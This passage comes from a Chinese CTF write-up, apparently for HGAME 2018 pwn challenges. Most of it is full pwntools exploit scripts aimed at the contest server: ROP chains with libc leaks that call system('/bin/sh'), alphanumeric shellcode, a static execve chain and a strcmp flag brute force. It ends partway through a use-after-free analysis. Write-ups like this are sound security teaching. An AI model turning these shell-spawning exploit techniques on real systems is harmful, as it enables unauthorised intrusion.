class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="hacker-system-v1"><a href="#hacker-system-v1" class="headerlink" title="hacker_system_v1"></a>hacker_system_v1</h2><p>程序功能较多，但留下的漏洞很明显， 用户可以自定义输入长度，但是用于存储的空间是一定的，因此存在栈溢出漏洞，并且没有开启canary保护。</p>
<p><img src="/img/hgame2018/2_3_1.png" alt=""></p>
<p>通常的栈溢出需要泄露libc地址，因此构造的rop分成两段，首先打印出puts@got泄露出libc地址，再read另一段rop到bss段中可以写的位置，最终将栈迁移过去。</p>
<p>解题的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver1'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./hacker_system_ver1'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">'b *0x8048B1B'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10005</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc32.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">'200'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">padding = <span class="string">'a'</span>*<span class="number">0x34</span></span><br><span class="line">pr = <span class="number">0x08048455</span></span><br><span class="line">pppr = <span class="number">0x08048d49</span></span><br><span class="line">rop = padding + p32(<span class="number">0x804be00</span>)+p32(elf.symbols[<span class="string">'puts'</span>]) + p32(pr) + p32(elf.got[<span class="string">'puts'</span>]) + p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804be00</span>) + p32(<span class="number">0x100</span>)+ p32(<span class="number">0x08048d4b</span>)+p32(<span class="number">0x804be00</span>)+p32(<span class="number">0x8048B1A</span>)<span class="comment"># p32(0x804843e)</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.recvuntil(<span class="string">'find!!\n'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts address:'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system address:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p32(<span class="number">0x804bc00</span>)+ p32(libc.symbols[<span class="string">'system'</span>])+p32(<span class="number">0xdeadbeef</span>)+p32(next(libc.search(<span class="string">'/bin/sh'</span>)))</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x08048d4b : pop ebp ; ret</span></span><br><span class="line"><span class="string">0x08048d48 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x08048455 : pop ebx ; ret</span></span><br><span class="line"><span class="string">0x08048d4a : pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x08048d49 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line"><span class="string">0x0804843e : ret</span></span><br><span class="line"><span class="string">0x080487f0 : ret 0x458b</span></span><br><span class="line"><span class="string">0x0804819c : ret 0x8694</span></span><br><span class="line"><span class="string">0x080485ce : ret 0xeac1</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h2 id="ez-shellcode-ver2"><a href="#ez-shellcode-ver2" class="headerlink" title="ez_shellcode_ver2"></a>ez_shellcode_ver2</h2><p>这个是ez_shellcode的升级版本，对shellcode长度没有限制，仅限制shellcode是a~zA~Z0~9范围内，这样的shellcode叫alpha shellcode，利用msfencode可以生成，但大多数时候都直接使用可以百度到的orz  <a href="http://blog.csdn.net/v_ling_v/article/details/42824007，其原理都是利用自解密将不可见字符利用异或等操作进行解密处理，如int" target="_blank" rel="noopener">http://blog.csdn.net/v_ling_v/article/details/42824007，其原理都是利用自解密将不可见字符利用异或等操作进行解密处理，如int</a> 80这样的指令。</p>
<p>解题的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./ez_shellcode_ver2'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	<span class="comment">#gdb.attach(p,'b *0x8048663')</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10007</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">shellcode = <span class="string">'''PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#a = shellcraft.sh()</span></span><br><span class="line"><span class="comment">#print len(asm(shellcode))</span></span><br><span class="line"></span><br><span class="line">p.sendline((shellcode))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="LEVEL-WEEK-3"><a href="#LEVEL-WEEK-3" class="headerlink" title="LEVEL - WEEK 3"></a>LEVEL - WEEK 3</h1><h2 id="hacker-system-ver2"><a href="#hacker-system-ver2" class="headerlink" title="hacker_system_ver2"></a>hacker_system_ver2</h2><p>这是第二周题目的升级版，除了编译环境从x86转换到了x64没任何差别，包括漏洞。</p>
<p>因此利用同样的解题思路进行rop构造，仅是gadget的使用方法不同罢了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./hacker_system_ver2'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./hacker_system_ver2'</span>)</span><br><span class="line">	context.log_level = <span class="string">'debug'</span></span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">	gdb.attach(p,<span class="string">'b *0x400d74'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10008</span>)</span><br><span class="line">	libc = ELF(<span class="string">'./libc64.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length:'</span>)</span><br><span class="line">p.sendline(<span class="string">'200'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">padding = <span class="string">'a'</span>*<span class="number">0x30</span></span><br><span class="line"><span class="comment">#pr = 0x08048455</span></span><br><span class="line"><span class="comment">#pppr = 0x08048d49</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400fb3</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000400fb1</span></span><br><span class="line">rbp_ret = <span class="number">0x0000000000400800</span></span><br><span class="line">rop = padding + p64(<span class="number">0x602e00</span>) + p64(rdi_ret) +p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.symbols[<span class="string">'puts'</span>]) + p64(rsi_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x602e00</span>) + p64(rdi_ret) + p64(<span class="number">0</span>) + p64(elf.symbols[<span class="string">'read'</span>]) + p64(rbp_ret) + p64(<span class="number">0x602e00</span>) + p64(<span class="number">0x400D74</span>)</span><br><span class="line"><span class="comment">#rop = padding + p32(0x804be00)+p32(elf.symbols['puts']) + p32(pr) + p32(elf.got['puts']) + p32(elf.symbols['read'])+p32(pppr)+p32(0)+p32(0x804be00) + p32(0x100)+ p32(0x08048d4b)+p32(0x804be00)+p32(0x8048B1A)# p32(0x804843e)</span></span><br><span class="line">p.sendline(rop)</span><br><span class="line">p.recvuntil(<span class="string">'find!!\n'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts address:'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system address:'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">rop = p64(<span class="number">0x602c00</span>)+ p64(rdi_ret) +p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">p.send(rop)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Gadgets information</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x0000000000400fac : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fae : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fab : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400faf : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400800 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fb1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400fad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006a9 : ret</span></span><br><span class="line"><span class="string">0x0000000000400a29 : ret 0x8b48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 12</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>题目中实现了一个简单的计算器。题目采用静态编译的方法，编译了需要的所有函数。</p>
<p><img src="/img/hgame2018/3_2_1.png" alt=""></p>
<p>漏洞在于每次存储结果时，计数器会往后移4个字节，但是对于存储结果个数没有限制，导致栈溢出。</p>
<p>利用ROPgadget的ropchain功能，对于静态编译的程序，很容易可以生成一个rop链，将rop链覆盖在返回地址处即可。</p>
<p>解题的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./calc'</span>)</span><br><span class="line">	<span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p= remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10009</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_rop_string</span><span class="params">()</span>:</span></span><br><span class="line">	rop = <span class="string">''</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">	rop += <span class="string">'/bin'</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">	rop += <span class="string">'//sh'</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080dee5d</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">	rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806d445</span>) <span class="comment"># int 0x80</span></span><br><span class="line">	<span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_save</span><span class="params">(num)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'a:'</span>)</span><br><span class="line">	p.sendline(str(num))</span><br><span class="line">	p.recvuntil(<span class="string">'b:'</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'success!!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">64</span>):</span><br><span class="line">		add_save(<span class="number">0xbadbad</span>)</span><br><span class="line">		<span class="keyword">print</span> <span class="string">'[+] round'</span>,str(i)</span><br><span class="line">	add_save(<span class="number">68</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rop_input</span><span class="params">(rop_string)</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(rop_string)/<span class="number">4</span>):</span><br><span class="line">		<span class="keyword">print</span> hex(u32(rop_string[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]))</span><br><span class="line">		add_save(u32(rop_string[<span class="number">4</span>*i:<span class="number">4</span>*(i+<span class="number">1</span>)]))</span><br><span class="line"></span><br><span class="line">padding()</span><br><span class="line"><span class="comment">#gdb.attach(p,'b *0x8048AC0')</span></span><br><span class="line">rop=<span class="string">'\xd3j\x05\x08`\xa0\x0e\x08F\x84\x0b\x08/bin\xfbQ\x05\x08\xd3j\x05\x08d\xa0\x0e\x08F\x84\x0b\x08//sh\xfbQ\x05\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\xfbQ\x05\x08\xc9\x81\x04\x08`\xa0\x0e\x08]\xee\r\x08h\xa0\x0e\x08\xd3j\x05\x08h\xa0\x0e\x08\x03\x96\x04\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08\x1f\xb0\x07\x08E\xd4\x06\x08'</span></span><br><span class="line"><span class="comment">#print '[*] flag',flag</span></span><br><span class="line">rop_input(rop)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'6'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'bye.'</span>)</span><br><span class="line">p.sendline(<span class="string">'cat flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="zazahui-ver2"><a href="#zazahui-ver2" class="headerlink" title="zazahui_ver2"></a>zazahui_ver2</h2><p>和上一版本的zazahui有所不同，这次利用的是strcmp的比较。</p>
<p><img src="/img/hgame2018/3_3_1.png" alt=""></p>
<p>同样存在s的溢出覆盖，不过此次不能简单的使用溢出来打印flag了，但是strcmp仍然可以利用，就是爆破。</p>
<p>逆向爆破flag的地址，可以大大缩短爆破次数。</p>
<p><img src="/img/hgame2018/3_3_2.png" alt=""></p>
<p>解题的exp脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">debug=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	p= process(<span class="string">'./zazahui_ver2'</span>)</span><br><span class="line">	<span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">	gdb.attach(p,<span class="string">'b *0x80487AB'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(<span class="string">'111.230.149.72 '</span>,  <span class="number">10010</span>)</span><br><span class="line">dic = range(<span class="number">33</span>,<span class="number">127</span>)</span><br><span class="line">dic.append(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#qdic.reverse()</span></span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">start = <span class="number">0x804A084</span></span><br><span class="line">end = <span class="number">0x804A060</span></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">i = start </span><br><span class="line"><span class="keyword">while</span> i&gt;=end:</span><br><span class="line">	pro = log.progress(<span class="string">'go'</span>)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">		pro.status(<span class="string">'boom for '</span>+hex(i))</span><br><span class="line">		bomb = (chr(j)+flag)+<span class="string">'\0'</span>*(<span class="number">0xb0</span>-len((chr(j)+flag)))+p32(i)</span><br><span class="line">		p.send(bomb)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'too'</span> <span class="keyword">in</span> p.recvuntil(<span class="string">'&gt;'</span>):</span><br><span class="line">			flag = chr(j) + flag</span><br><span class="line">			pro.success(hex(i)+<span class="string">':  '</span>+hex(j)+<span class="string">'  '</span>+chr(j))</span><br><span class="line">			i = i<span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#a= 'a'*0xb0+p32(0x804A060)+p32(0x99)</span></span><br><span class="line"><span class="comment">#p.recv()</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] flag'</span>,flag</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="message-saver"><a href="#message-saver" class="headerlink" title="message_saver"></a>message_saver</h2><p>程序实现了一个可以加解密存储的记事本，逻辑简单</p>
<p><img src="/img/hgame2018/3_4_0.png" alt=""></p>
<p>只维护了一个变量作为message的存储结构，结构如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">| length     |     address     |    function ptr    | </span><br><span class="line">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
<p>其生成方法在add函数中：</p>
<p><img src="/img/hgame2018/3_4_1.png" alt=""></p>
<p>在edit函数中可以重新编辑信息，在编辑过程中会重新申请一个内存块，但原来的并不会释放（内存泄露），最终会执行function（address）函数，主要如果可以控制内存块的内容，就完全可以控制执行逻辑。</p>
<p>在delete函数中会free掉这个内存块，但并未置空结构体，存在一个悬垂指针。</p>
<p>并且，在全部的函数中都没有检测都没有检测是否已经删除了结构块，导致一个UAF漏洞、double free漏洞。</p>
